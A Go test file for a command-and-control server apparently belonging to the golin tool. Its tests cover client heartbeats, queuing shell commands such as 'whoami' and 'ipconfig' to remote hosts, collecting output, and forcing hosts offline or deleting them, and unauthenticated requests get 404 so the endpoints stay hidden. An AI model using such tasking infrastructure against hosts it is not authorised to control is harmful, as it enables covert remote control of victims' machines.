package main

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"golin/c2config"
)

// resetState 重置注册表、在线窗口与数据目录,保证测试相互隔离
func resetState(t *testing.T) {
	t.Helper()
	regMu.Lock()
	registry = map[string]*clientState{}
	regMu.Unlock()
	offlineMu.Lock()
	forcedOffline = map[string]bool{}
	offlineMu.Unlock()
	*online = 60 * time.Second
	*dir = t.TempDir()
}

func authed(r *http.Request) { r.Header.Set(c2config.HeaderName, c2config.Token) }

func uiCookie(r *http.Request) {
	r.AddCookie(&http.Cookie{Name: "c2session", Value: c2config.Token})
}

func TestHealthTracksOnline(t *testing.T) {
	resetState(t)

	// 心跳后应在线
	req := httptest.NewRequest("POST", c2config.HealthPath,
		strings.NewReader(`{"client_id":"PC1"}`))
	authed(req)
	w := httptest.NewRecorder()
	handleHealth(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("health status = %d", w.Code)
	}
	regMu.Lock()
	isOn := isOnline(registry["PC1"])
	regMu.Unlock()
	if !isOn {
		t.Fatal("client should be online after heartbeat")
	}

	// 无 token 应 404
	w2 := httptest.NewRecorder()
	handleHealth(w2, httptest.NewRequest("POST", c2config.HealthPath,
		strings.NewReader(`{"client_id":"PC1"}`)))
	if w2.Code != http.StatusNotFound {
		t.Fatalf("unauthed health status = %d, want 404", w2.Code)
	}

	// 超过在线窗口后应离线
	*online = time.Nanosecond
	time.Sleep(2 * time.Millisecond)
	regMu.Lock()
	isOn = isOnline(registry["PC1"])
	regMu.Unlock()
	if isOn {
		t.Fatal("client should be offline after window elapsed")
	}
}

func TestClientsListMergesRegistry(t *testing.T) {
	resetState(t)
	touch("PC1", "heartbeat")
	touch("PC2", "report")

	req := httptest.NewRequest("GET", "/api/clients", nil)
	uiCookie(req)
	w := httptest.NewRecorder()
	handleClients(w, req)

	var list []struct {
		ID     string `json:"id"`
		Status string `json:"status"`
	}
	if err := json.NewDecoder(w.Body).Decode(&list); err != nil {
		t.Fatal(err)
	}
	found := map[string]string{}
	for _, c := range list {
		found[c.ID] = c.Status
	}
	if found["PC1"] != "online" || found["PC2"] != "online" {
		t.Fatalf("expected PC1/PC2 online, got %+v", found)
	}
}

// TestClientsDeduplicatesLogFiles 注册表中的客户端与日志文件(safeName 形态)
// 必须按同一台主机去重,且事件数来自日志文件
func TestClientsDeduplicatesLogFiles(t *testing.T) {
	resetState(t)
	touch(`PC1\admin`, "heartbeat") // 含反斜杠的 client_id,日志文件名为 PC1_admin.log

	// 写入该主机的日志文件(文件名经过 safeName)
	if err := os.WriteFile(filepath.Join(*dir, "PC1_admin.log"),
		[]byte("line1\nline2\nline3\n"), 0644); err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest("GET", "/api/clients", nil)
	uiCookie(req)
	w := httptest.NewRecorder()
	handleClients(w, req)

	var list []struct {
		ID     string `json:"id"`
		Status string `json:"status"`
		Events int    `json:"events"`
	}
	if err := json.NewDecoder(w.Body).Decode(&list); err != nil {
		t.Fatal(err)
	}
	if len(list) != 1 {
		t.Fatalf("expected 1 client after dedup, got %d: %+v", len(list), list)
	}
	if list[0].ID != `PC1\admin` || list[0].Status != "online" || list[0].Events != 3 {
		t.Fatalf("bad merged client: %+v", list[0])
	}
}

func TestTaskLifecycle(t *testing.T) {
	resetState(t)

	// 1. 控制台下发任务 → pending
	req := httptest.NewRequest("POST", c2config.TasksPath,
		strings.NewReader(`{"client_id":"PC1","command":"whoami"}`))
	uiCookie(req)
	w := httptest.NewRecorder()
	handleTasks(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("enqueue status = %d, body = %s", w.Code, w.Body.String())
	}
	var task c2config.Task
	if err := json.NewDecoder(w.Body).Decode(&task); err != nil {
		t.Fatal(err)
	}
	if task.Status != c2config.TaskPending || task.ID == "" {
		t.Fatalf("bad task: %+v", task)
	}

	// 2. 客户端拉取 → 返回 1 条并标记 sent
	fetch := func() []*c2config.Task {
		r := httptest.NewRequest("GET", c2config.TasksPath+"?client=PC1", nil)
		authed(r)
		rr := httptest.NewRecorder()
		handleTasks(rr, r)
		var tasks []*c2config.Task
		if err := json.NewDecoder(rr.Body).Decode(&tasks); err != nil {
			t.Fatal(err)
		}
		return tasks
	}
	got := fetch()
	if len(got) != 1 || got[0].ID != task.ID {
		t.Fatalf("client fetch got %+v", got)
	}
	// 重复拉取不应再返回(已 sent)
	if again := fetch(); len(again) != 0 {
		t.Fatalf("second fetch should be empty, got %+v", again)
	}

	// 3. 控制台重发 → 回到 pending,客户端可再次拉取
	req2 := httptest.NewRequest("POST", c2config.TasksPath,
		strings.NewReader(`{"id":"`+task.ID+`","action":"requeue"}`))
	uiCookie(req2)
	handleTasks(httptest.NewRecorder(), req2)
	if again := fetch(); len(again) != 1 {
		t.Fatalf("fetch after requeue got %+v, want 1", again)
	}

	// 4. 客户端回传结果 → done
	req3 := httptest.NewRequest("POST", c2config.ResultPath,
		strings.NewReader(`{"id":"`+task.ID+`","client_id":"PC1","output":"desktop-abc\\admin"}`))
	authed(req3)
	handleResult(httptest.NewRecorder(), req3)
	regMu.Lock()
	var done *c2config.Task
	for _, tk := range registry["PC1"].Tasks {
		if tk.ID == task.ID {
			done = tk
		}
	}
	regMu.Unlock()
	if done == nil || done.Status != c2config.TaskDone || done.Result == "" {
		t.Fatalf("task not marked done: %+v", done)
	}

	// 5. 控制台删除任务
	req4 := httptest.NewRequest("POST", c2config.TasksPath,
		strings.NewReader(`{"id":"`+task.ID+`","action":"delete"}`))
	uiCookie(req4)
	handleTasks(httptest.NewRecorder(), req4)
	regMu.Lock()
	left := len(registry["PC1"].Tasks)
	regMu.Unlock()
	if left != 0 {
		t.Fatalf("task not deleted, %d left", left)
	}
}

// TestTaskStaleRequeue 已下发但超时未回传结果的任务应自动重投(至少一次语义)
func TestTaskStaleRequeue(t *testing.T) {
	resetState(t)

	// 下发任务
	req := httptest.NewRequest("POST", c2config.TasksPath,
		strings.NewReader(`{"client_id":"PC1","command":"whoami"}`))
	uiCookie(req)
	handleTasks(httptest.NewRecorder(), req)

	fetch := func() []*c2config.Task {
		r := httptest.NewRequest("GET", c2config.TasksPath+"?client=PC1", nil)
		authed(r)
		rr := httptest.NewRecorder()
		handleTasks(rr, r)
		var tasks []*c2config.Task
		if err := json.NewDecoder(rr.Body).Decode(&tasks); err != nil {
			t.Fatal(err)
		}
		return tasks
	}

	if got := fetch(); len(got) != 1 {
		t.Fatalf("first fetch got %d, want 1", len(got))
	}
	// 未超时:重复拉取应为空
	if got := fetch(); len(got) != 0 {
		t.Fatalf("fetch before stale got %d, want 0", len(got))
	}
	// 将 SentAt 改到超时之前,模拟客户端取走后崩溃/结果丢失
	regMu.Lock()
	registry["PC1"].Tasks[0].SentAt = time.Now().Unix() - int64(staleSentAfter.Seconds()) - 1
	regMu.Unlock()
	// 超时未回传:自动重投
	if got := fetch(); len(got) != 1 {
		t.Fatalf("fetch after stale got %d, want 1", len(got))
	}
}

func TestTasksAuth(t *testing.T) {
	resetState(t)

	// 客户端拉取:无 token → 404
	w := httptest.NewRecorder()
	handleTasks(w, httptest.NewRequest("GET", c2config.TasksPath+"?client=PC1", nil))
	if w.Code != http.StatusNotFound {
		t.Fatalf("unauthed tasks status = %d, want 404", w.Code)
	}
	// 控制台管理:无 cookie → 404
	w2 := httptest.NewRecorder()
	handleTasks(w2, httptest.NewRequest("POST", c2config.TasksPath,
		strings.NewReader(`{"client_id":"PC1","command":"whoami"}`)))
	if w2.Code != http.StatusNotFound {
		t.Fatalf("unauthed tasks mgmt status = %d, want 404", w2.Code)
	}
	// 结果回传:无 token → 404
	w3 := httptest.NewRecorder()
	handleResult(w3, httptest.NewRequest("POST", c2config.ResultPath,
		strings.NewReader(`{"id":"x","client_id":"PC1"}`)))
	if w3.Code != http.StatusNotFound {
		t.Fatalf("unauthed result status = %d, want 404", w3.Code)
	}
}

// TestTaskPersistence 验证任务落盘与重启恢复(含状态与结果)
func TestTaskPersistence(t *testing.T) {
	dataDir := t.TempDir()
	*dir = dataDir
	*online = 60 * time.Second
	regMu.Lock()
	registry = map[string]*clientState{}
	regMu.Unlock()

	enqueue := func(cmd string) c2config.Task {
		r := httptest.NewRequest("POST", c2config.TasksPath,
			strings.NewReader(`{"client_id":"PC1","command":"`+cmd+`"}`))
		uiCookie(r)
		w := httptest.NewRecorder()
		handleTasks(w, r)
		var task c2config.Task
		if err := json.NewDecoder(w.Body).Decode(&task); err != nil {
			t.Fatal(err)
		}
		return task
	}

	t1 := enqueue("whoami")
	// t1:客户端拉取(sent)并回传结果(done)
	r := httptest.NewRequest("GET", c2config.TasksPath+"?client=PC1", nil)
	authed(r)
	handleTasks(httptest.NewRecorder(), r)
	rr := httptest.NewRequest("POST", c2config.ResultPath,
		strings.NewReader(`{"id":"`+t1.ID+`","client_id":"PC1","output":"admin"}`))
	authed(rr)
	handleResult(httptest.NewRecorder(), rr)
	// t2:保持 pending
	t2 := enqueue("ipconfig")

	// 落盘文件应已生成
	if _, err := os.Stat(tasksFilePath()); err != nil {
		t.Fatalf("tasks file not written: %v", err)
	}

	// 模拟重启:清空内存注册表后重新加载
	regMu.Lock()
	registry = map[string]*clientState{}
	regMu.Unlock()
	loadTasks()

	regMu.Lock()
	st := registry["PC1"]
	regMu.Unlock()
	if st == nil || len(st.Tasks) != 2 {
		t.Fatalf("restored tasks = %+v", st)
	}
	byID := map[string]*c2config.Task{}
	for _, tk := range st.Tasks {
		byID[tk.ID] = tk
	}
	if byID[t1.ID] == nil || byID[t1.ID].Status != c2config.TaskDone || byID[t1.ID].Result != "admin" {
		t.Fatalf("t1 not restored correctly: %+v", byID[t1.ID])
	}
	if byID[t2.ID] == nil || byID[t2.ID].Status != c2config.TaskPending {
		t.Fatalf("t2 not restored correctly: %+v", byID[t2.ID])
	}
}

// TestTaskPersistenceCorrupt 损坏的任务文件应被忽略,不 panic、不影响启动
func TestTaskPersistenceCorrupt(t *testing.T) {
	dataDir := t.TempDir()
	*dir = dataDir
	regMu.Lock()
	registry = map[string]*clientState{}
	regMu.Unlock()
	if err := os.WriteFile(tasksFilePath(), []byte("not json {{{"), 0644); err != nil {
		t.Fatal(err)
	}
	loadTasks()
	regMu.Lock()
	n := len(registry)
	regMu.Unlock()
	if n != 0 {
		t.Fatalf("registry should be empty after corrupt load, got %d entries", n)
	}
}

// TestDispatchPanel 命令下发记录接口:跨主机聚合、按时间倒序、鉴权
func TestDispatchPanel(t *testing.T) {
	resetState(t)

	enqueue := func(client, cmd string) {
		r := httptest.NewRequest("POST", c2config.TasksPath,
			strings.NewReader(`{"client_id":"`+client+`","command":"`+cmd+`"}`))
		uiCookie(r)
		handleTasks(httptest.NewRecorder(), r)
	}
	enqueue("PC1", "whoami")
	enqueue("PC2", "echo 你好")

	req := httptest.NewRequest("GET", "/api/dispatch", nil)
	uiCookie(req)
	w := httptest.NewRecorder()
	handleDispatch(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("dispatch status = %d, body = %s", w.Code, w.Body.String())
	}
	var items []dispatchItem
	if err := json.NewDecoder(w.Body).Decode(&items); err != nil {
		t.Fatal(err)
	}
	if len(items) != 2 {
		t.Fatalf("want 2 items, got %d", len(items))
	}
	// 后下发的在前(倒序)
	if items[0].ClientID != "PC2" || items[0].Command != "echo 你好" {
		t.Fatalf("bad first item: %+v", items[0])
	}
	// 未鉴权 404
	w2 := httptest.NewRecorder()
	handleDispatch(w2, httptest.NewRequest("GET", "/api/dispatch", nil))
	if w2.Code != http.StatusNotFound {
		t.Fatalf("unauthed dispatch status = %d, want 404", w2.Code)
	}
}

// TestTruncateRunes 结果摘要截断应落在 rune 边界,不切断多字节字符
func TestTruncateRunes(t *testing.T) {
	s := "你好世界"
	got, trunc := truncateRunes(s, 3) // 3 落在"你"的中间字节
	if !trunc || got != "你" {
		t.Fatalf("truncateRunes = %q/%v, want 你/true", got, trunc)
	}
	if g, tr := truncateRunes("abc", 10); tr || g != "abc" {
		t.Fatalf("short string: %q/%v", g, tr)
	}
	if g, tr := truncateRunes(s, len(s)); tr || g != s {
		t.Fatalf("exact length: %q/%v", g, tr)
	}
}

// TestTaskTrim 任务数超出上限时丢弃最旧任务
func TestTaskTrim(t *testing.T) {
	resetState(t)
	old := maxTasksPerClient
	maxTasksPerClient = 3
	defer func() { maxTasksPerClient = old }()

	for i := 0; i < 5; i++ {
		r := httptest.NewRequest("POST", c2config.TasksPath,
			strings.NewReader(`{"client_id":"PC1","command":"cmd"}`))
		uiCookie(r)
		handleTasks(httptest.NewRecorder(), r)
	}
	regMu.Lock()
	n := len(registry["PC1"].Tasks)
	regMu.Unlock()
	if n != 3 {
		t.Fatalf("want 3 tasks after trim, got %d", n)
	}
}

// listClients 拉取 /api/clients 并解析,返回按 id 索引的状态与强制下线标记
func listClients(t *testing.T) map[string]struct {
	Status string `json:"status"`
	Forced bool   `json:"forced"`
} {
	t.Helper()
	req := httptest.NewRequest("GET", "/api/clients", nil)
	uiCookie(req)
	w := httptest.NewRecorder()
	handleClients(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("clients status = %d", w.Code)
	}
	var list []struct {
		ID     string `json:"id"`
		Status string `json:"status"`
		Forced bool   `json:"forced"`
	}
	if err := json.NewDecoder(w.Body).Decode(&list); err != nil {
		t.Fatal(err)
	}
	out := map[string]struct {
		Status string `json:"status"`
		Forced bool   `json:"forced"`
	}{}
	for _, c := range list {
		out[c.ID] = struct {
			Status string `json:"status"`
			Forced bool   `json:"forced"`
		}{c.Status, c.Forced}
	}
	return out
}

// hostAction 通过控制台 POST /api/clients 执行主机管理动作
func hostAction(t *testing.T, id, action string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest("POST", "/api/clients",
		strings.NewReader(`{"id":"`+id+`","action":"`+action+`"}`))
	uiCookie(req)
	w := httptest.NewRecorder()
	handleClients(w, req)
	return w
}

// TestHostForceOffline 强制下线后心跳不改变离线状态;恢复上线后自然在线
func TestHostForceOffline(t *testing.T) {
	resetState(t)
	touch("PC1", "heartbeat")

	if s := listClients(t)["PC1"]; s.Status != "online" {
		t.Fatalf("PC1 should be online, got %+v", s)
	}
	if w := hostAction(t, "PC1", "offline"); w.Code != http.StatusOK {
		t.Fatalf("offline action status = %d", w.Code)
	}
	// 强制下线期间继续心跳,状态仍应为离线且带 forced 标记
	touch("PC1", "heartbeat")
	s := listClients(t)["PC1"]
	if s.Status != "offline" || !s.Forced {
		t.Fatalf("forced offline PC1 = %+v, want offline/forced", s)
	}
	// 恢复上线后回到自然在线
	if w := hostAction(t, "PC1", "online"); w.Code != http.StatusOK {
		t.Fatalf("online action status = %d", w.Code)
	}
	if s = listClients(t)["PC1"]; s.Status != "online" || s.Forced {
		t.Fatalf("restored PC1 = %+v, want online/not-forced", s)
	}
}

// TestHostOfflinePersistence 下线名单落盘,重启(重载)后仍生效
func TestHostOfflinePersistence(t *testing.T) {
	resetState(t)
	touch("PC1", "heartbeat")
	hostAction(t, "PC1", "offline")
	if _, err := os.Stat(offlineFilePath()); err != nil {
		t.Fatalf("offline file not written: %v", err)
	}

	// 模拟重启:清空内存名单后重新加载
	offlineMu.Lock()
	forcedOffline = map[string]bool{}
	offlineMu.Unlock()
	loadOffline()

	if s := listClients(t)["PC1"]; !s.Forced || s.Status != "offline" {
		t.Fatalf("PC1 should stay forced offline after reload, got %+v", s)
	}
}

// TestHostOfflineCorrupt 损坏的下线名单应被忽略,不 panic、不影响启动
func TestHostOfflineCorrupt(t *testing.T) {
	resetState(t)
	if err := os.WriteFile(offlineFilePath(), []byte("not json {{{"), 0644); err != nil {
		t.Fatal(err)
	}
	loadOffline()
	offlineMu.Lock()
	n := len(forcedOffline)
	offlineMu.Unlock()
	if n != 0 {
		t.Fatalf("forced set should be empty after corrupt load, got %d", n)
	}
}

// TestHostDelete 删除主机应清除注册表状态、任务持久化与日志文件
func TestHostDelete(t *testing.T) {
	resetState(t)
	touch("PC1", "heartbeat")
	// 下发一条任务并写入日志文件
	r := httptest.NewRequest("POST", c2config.TasksPath,
		strings.NewReader(`{"client_id":"PC1","command":"whoami"}`))
	uiCookie(r)
	handleTasks(httptest.NewRecorder(), r)
	logPath := filepath.Join(*dir, "PC1.log")
	if err := os.WriteFile(logPath, []byte("line1\n"), 0644); err != nil {
		t.Fatal(err)
	}

	if w := hostAction(t, "PC1", "delete"); w.Code != http.StatusOK {
		t.Fatalf("delete status = %d, body = %s", w.Code, w.Body.String())
	}
	regMu.Lock()
	_, inReg := registry["PC1"]
	regMu.Unlock()
	if inReg {
		t.Fatal("PC1 still in registry after delete")
	}
	if _, err := os.Stat(logPath); !os.IsNotExist(err) {
		t.Fatal("log file not removed after delete")
	}
	// 任务持久化文件不应再包含该主机的任务
	regMu.Lock()
	registry = map[string]*clientState{}
	regMu.Unlock()
	loadTasks()
	regMu.Lock()
	_, inReg = registry["PC1"]
	regMu.Unlock()
	if inReg {
		t.Fatal("deleted host tasks restored from disk")
	}
	// 已删除主机再次删除应 404
	if w := hostAction(t, "PC1", "delete"); w.Code != http.StatusNotFound {
		t.Fatalf("double delete status = %d, want 404", w.Code)
	}
}

// TestHostActionAuth 主机管理接口未登录应 404
func TestHostActionAuth(t *testing.T) {
	resetState(t)
	req := httptest.NewRequest("POST", "/api/clients",
		strings.NewReader(`{"id":"PC1","action":"offline"}`))
	w := httptest.NewRecorder()
	handleClients(w, req)
	if w.Code != http.StatusNotFound {
		t.Fatalf("unauthed host action status = %d, want 404", w.Code)
	}
	// 未知动作应 400
	req2 := httptest.NewRequest("POST", "/api/clients",
		strings.NewReader(`{"id":"PC1","action":"bogus"}`))
	uiCookie(req2)
	w2 := httptest.NewRecorder()
	handleClients(w2, req2)
	if w2.Code != http.StatusBadRequest {
		t.Fatalf("unknown action status = %d, want 400", w2.Code)
	}
}
